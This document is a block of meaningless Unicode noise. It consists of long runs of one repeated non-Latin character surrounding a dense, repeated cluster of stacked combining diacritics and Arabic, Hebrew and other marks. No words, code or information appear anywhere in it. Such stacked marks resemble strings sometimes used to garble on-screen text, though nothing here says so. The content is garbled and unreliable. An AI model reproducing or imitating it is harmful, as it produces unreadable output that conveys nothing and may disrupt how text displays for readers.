ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ